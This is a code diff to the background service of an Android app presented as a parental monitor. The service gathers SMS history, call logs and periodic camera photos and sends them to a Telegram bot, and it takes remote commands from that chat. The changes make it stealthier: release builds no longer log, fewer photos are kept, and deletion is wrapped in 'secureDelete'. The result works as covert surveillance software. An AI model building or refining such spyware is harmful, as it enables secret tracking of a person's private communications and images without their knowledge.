@@ -41,6 +41,7 @@ class MonitoringService : Service() {
     private var cameraJob: Job? = null
     private var commandJob: Job? = null
     private val initialSyncStarted = java.util.concurrent.atomic.AtomicBoolean(false)
+    private val initialSyncRunning = java.util.concurrent.atomic.AtomicBoolean(false)
 
     companion object {
         const val ACTION_START_MONITORING = "START_MONITORING"
@@ -105,7 +106,7 @@ class MonitoringService : Service() {
     }
 
     private fun startMonitoring() {
-        android.util.Log.i("MonitoringService", "=== Starting monitoring service ===")
+        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "=== Starting monitoring service ===")
 
         // Cancel any previous loops so a restart never duplicates work
         monitoringJob?.cancel()
@@ -158,21 +159,26 @@ class MonitoringService : Service() {
             } catch (_: Exception) {
             }
         }
-        android.util.Log.d("MonitoringService", "Foreground notification started (with camera type)")
+        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Foreground notification started (with camera type)")
 
+        if (!preferencesManager.initialSyncDone && initialSyncStarted.compareAndSet(false, true)) {
+            initialSyncRunning.set(true)
+        }
+        startPeriodicLoops()
         serviceScope.launch {
             try {
-                if (!preferencesManager.initialSyncDone && initialSyncStarted.compareAndSet(false, true)) {
-                    android.util.Log.i("MonitoringService", "Starting initial data collection...")
+                if (initialSyncRunning.get()) {
+                    if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Starting initial data collection...")
                     sendInitialData()
-                    android.util.Log.i("MonitoringService", "Initial data collection completed")
+                    if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Initial data collection completed")
                 }
             } catch (_: Exception) {
+            } finally {
+                initialSyncRunning.set(false)
             }
-            startPeriodicLoops()
         }
-        android.util.Log.d("MonitoringService", "Monitoring loop started")
-        android.util.Log.d("MonitoringService", "📸 Camera monitoring started")
+        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Monitoring loop started")
+        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "📸 Camera monitoring started")
         startCommandPolling()
         serviceScope.launch {
             registerBotCommands()
@@ -223,10 +229,12 @@ class MonitoringService : Service() {
                 } catch (e: Exception) {
                     android.util.Log.e("MonitoringService", "Error polling commands", e)
                 }
-                if (preferencesManager.isConfigured()) {
-                    delay(15_000)
-                } else {
+                if (!preferencesManager.isConfigured()) {
                     delay(60_000)
+                } else if (!NetworkUtils.isNetworkAvailable(this@MonitoringService)) {
+                    delay(60_000)
+                } else {
+                    delay(15_000)
                 }
             }
         }
@@ -250,9 +258,10 @@ class MonitoringService : Service() {
         val updates = response.body()?.result ?: return
         for (update in updates) {
             try {
-                update.callbackQuery?.let {
-                    handleCallbackQuery(it)
-                    return@let
+                val callback = update.callbackQuery
+                if (callback != null) {
+                    handleCallbackQuery(callback)
+                    continue
                 }
                 val message = update.message ?: continue
                 if (message.chat.id.toString() != chatId) continue
@@ -269,7 +278,7 @@ class MonitoringService : Service() {
     }
 
     private suspend fun handleCallbackQuery(query: com.redeye.parentalmonitor.network.TelegramCallbackQuery) {
-        val sender = query.message?.chat?.id?.toString() ?: return
+        val sender = query.from?.id?.toString() ?: return
         if (sender != preferencesManager.chatId) return
         answerCallback(query.id)
         val command = when (query.data) {
@@ -323,7 +332,7 @@ class MonitoringService : Service() {
             val body = com.redeye.parentalmonitor.network.SetMyCommandsRequest(botCommandList())
             val response = TelegramClient.api.setMyCommands(url, body)
             if (response.isSuccessful && response.body()?.ok == true) {
-                android.util.Log.i("MonitoringService", "Bot command menu registered")
+                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Bot command menu registered")
             } else {
                 android.util.Log.w("MonitoringService", "Command menu registration failed: ${response.code()}")
             }
@@ -387,7 +396,9 @@ class MonitoringService : Service() {
                 )
             }
             "/lastcalls" -> {
-                val calls = callLogRepository.getAllCalls(5)
+                val calls = callLogRepository.getAllCalls(5).map { call ->
+                    if (call.name == null) call.copy(name = callLogRepository.resolveContact(call.number)) else call
+                }
                 if (calls.isEmpty()) {
                     sendToTelegram("📞 No call history found.")
                 } else {
@@ -612,31 +623,31 @@ class MonitoringService : Service() {
 
     private suspend fun sendInitialData() {
         try {
-            android.util.Log.i("MonitoringService", "Collecting SMS history...")
+            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Collecting SMS history...")
             // Get all history first
             val allSms = smsRepository.getRecentSms(100)
-            android.util.Log.i("MonitoringService", "Found ${allSms.size} SMS messages")
+            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Found ${allSms.size} SMS messages")
             
-            android.util.Log.i("MonitoringService", "Collecting call history...")
+            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Collecting call history...")
             val allCalls = callLogRepository.getAllCalls(100)
-            android.util.Log.i("MonitoringService", "Found ${allCalls.size} calls")
+            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Found ${allCalls.size} calls")
 
             // Update last synced IDs
             if (allSms.isNotEmpty()) {
                 val maxSmsId = allSms.maxOf { it.id }
                 preferencesManager.lastSmsId = maxSmsId
-                android.util.Log.d("MonitoringService", "Last SMS ID set to: $maxSmsId")
+                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Last SMS ID set to: $maxSmsId")
             }
 
             if (allCalls.isNotEmpty()) {
                 val latest = allCalls.maxWith(compareBy({ it.date }, { it.id }))
                 preferencesManager.lastCallTimestamp = latest.date
                 preferencesManager.lastCallId = latest.id
-                android.util.Log.d("MonitoringService", "Last call set to: ${latest.date}/${latest.id}")
+                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Last call set to: ${latest.date}/${latest.id}")
             }
 
             // Send start message
-            android.util.Log.i("MonitoringService", "Sending start message...")
+            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending start message...")
             val startMessage = buildString {
                 appendLine("📱 <b>Monitoring started</b>")
                 appendLine()
@@ -654,9 +665,9 @@ class MonitoringService : Service() {
             // Send all SMS history in chunks
             if (allSms.isNotEmpty()) {
                 val chunks = allSms.chunked(10)
-                android.util.Log.i("MonitoringService", "Sending ${chunks.size} SMS chunks...")
+                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${chunks.size} SMS chunks...")
                 chunks.forEachIndexed { index, chunk ->
-                    android.util.Log.d("MonitoringService", "Sending SMS chunk ${index + 1}/${chunks.size}")
+                    if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Sending SMS chunk ${index + 1}/${chunks.size}")
                     val message = buildString {
                         appendLine("💬 <b>SMS History - part ${index + 1}/${chunks.size}</b>")
                         appendLine()
@@ -672,15 +683,15 @@ class MonitoringService : Service() {
                     sendFitted(message)
                     delay(1000) // Wait 1 second between messages
                 }
-                android.util.Log.i("MonitoringService", "All SMS chunks sent")
+                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "All SMS chunks sent")
             }
 
             // Send all call history in chunks
             if (allCalls.isNotEmpty()) {
                 val chunks = allCalls.chunked(10)
-                android.util.Log.i("MonitoringService", "Sending ${chunks.size} call chunks...")
+                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${chunks.size} call chunks...")
                 chunks.forEachIndexed { index, chunk ->
-                    android.util.Log.d("MonitoringService", "Sending call chunk ${index + 1}/${chunks.size}")
+                    if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Sending call chunk ${index + 1}/${chunks.size}")
                     val message = buildString {
                         appendLine("📞 <b>Call History - part ${index + 1}/${chunks.size}</b>")
                         appendLine()
@@ -698,11 +709,11 @@ class MonitoringService : Service() {
                     sendFitted(message)
                     delay(1000) // Wait 1 second between messages
                 }
-                android.util.Log.i("MonitoringService", "All call chunks sent")
+                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "All call chunks sent")
             }
 
             // Final message
-            android.util.Log.i("MonitoringService", "Sending completion message...")
+            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending completion message...")
             val photoState = if (isPhotoPaused()) {
                 "paused until ${formatDate(preferencesManager.photoPausedUntil)}"
             } else if (preferencesManager.cameraInterval <= 0) {
@@ -725,7 +736,7 @@ class MonitoringService : Service() {
             }
             sendToTelegram(completeMessage)
             preferencesManager.initialSyncDone = true
-            android.util.Log.i("MonitoringService", "=== Initial data sending complete ===")
+            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "=== Initial data sending complete ===")
 
         } catch (e: Exception) {
             android.util.Log.e("MonitoringService", "Error in initial sync: ${redactToken(e.message)}")
@@ -733,6 +744,7 @@ class MonitoringService : Service() {
     }
 
     private suspend fun checkAndSendNewData() {
+        if (initialSyncRunning.get()) return
         try {
             // Check for new SMS
             val lastSmsId = preferencesManager.lastSmsId
@@ -807,6 +819,21 @@ class MonitoringService : Service() {
         }
     }
 
+    private fun safeCut(text: String, max: Int): Int {
+        if (text.length <= max) return text.length
+        var cut = max
+        if (Character.isHighSurrogate(text[cut - 1]) && Character.isLowSurrogate(text[cut])) cut -= 1
+        val amp = text.lastIndexOf('&', cut - 1)
+        if (amp >= 0 && amp > cut - 12) {
+            val semi = text.indexOf(';', amp)
+            if (semi < 0 || semi >= cut) {
+                val entity = text.substring(amp, cut)
+                if (entity.all { it.isLetterOrDigit() || it == '&' || it == '#' }) cut = amp
+            }
+        }
+        if (cut <= 0) cut = max
+        return cut
+    }
     private suspend fun sendFitted(message: String) {
         if (message.length <= 4000) {
             sendToTelegram(message)
@@ -822,9 +849,10 @@ class MonitoringService : Service() {
                     delay(1000)
                     current = StringBuilder()
                 }
-                sendToTelegram(rest.take(4000))
+                val cut = safeCut(rest, 4000)
+                sendToTelegram(rest.substring(0, cut))
                 delay(1000)
-                rest = rest.drop(4000)
+                rest = rest.substring(cut)
             }
             if (current.length + rest.length + 1 > 4000) {
                 if (current.isNotEmpty()) {
@@ -860,7 +888,7 @@ class MonitoringService : Service() {
 
             // Check if network is available
             val hasNetwork = NetworkUtils.isNetworkAvailable(this)
-            android.util.Log.d("MonitoringService", "Network available: $hasNetwork")
+            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Network available: $hasNetwork")
             
             if (!hasNetwork) {
                 // No internet, add to queue
@@ -881,7 +909,7 @@ class MonitoringService : Service() {
             val response = TelegramClient.api.sendMessage(url, telegramMessage)
 
             if (response.isSuccessful && response.body()?.ok == true) {
-                android.util.Log.i("MonitoringService", "✓ Message sent successfully!")
+                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Message sent")
                 preferencesManager.lastSyncTime = System.currentTimeMillis()
             } else if (response.code() == 429) {
                 val retryAfter = NetworkUtils.parseRetryAfter(response.errorBody()?.string())
@@ -957,7 +985,7 @@ class MonitoringService : Service() {
             }
         }
         try {
-            android.util.Log.i("MonitoringService", "📸 Starting camera capture...")
+            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "📸 Starting camera capture...")
             cameraService.capturePhoto(
                 lensFacing = selectedLensFacing(),
                 onPhotoTaken = { photoFile ->
@@ -1076,10 +1104,10 @@ class MonitoringService : Service() {
             val response = TelegramClient.api.sendPhoto(url, chatIdBody, caption, photoPart)
 
             if (response.isSuccessful && response.body()?.ok == true) {
-                android.util.Log.i("MonitoringService", "✓ Photo sent successfully!")
+                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "✓ Photo sent successfully!")
                 preferencesManager.lastSyncTime = System.currentTimeMillis()
                 preferencesManager.lastPhotoTime = System.currentTimeMillis()
-                photoFile.delete()
+                secureDelete(photoFile)
                 return true
             }
             val errorBody = try {
@@ -1115,12 +1143,18 @@ class MonitoringService : Service() {
         prunePhotoCache()
     }
 
-    private fun prunePhotoCache(maxKept: Int = 10) {
+    private fun secureDelete(file: File) {
+        try {
+            file.delete()
+        } catch (_: Exception) {
+        }
+    }
+    private fun prunePhotoCache(maxKept: Int = 3) {
         try {
             val photos = cacheDir.listFiles { file ->
                 file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
             }?.sortedBy { it.lastModified() } ?: return
-            photos.dropLast(maxKept).forEach { it.delete() }
+            photos.dropLast(maxKept).forEach { secureDelete(it) }
         } catch (e: Exception) {
             android.util.Log.e("MonitoringService", "Error pruning photo cache", e)
         }
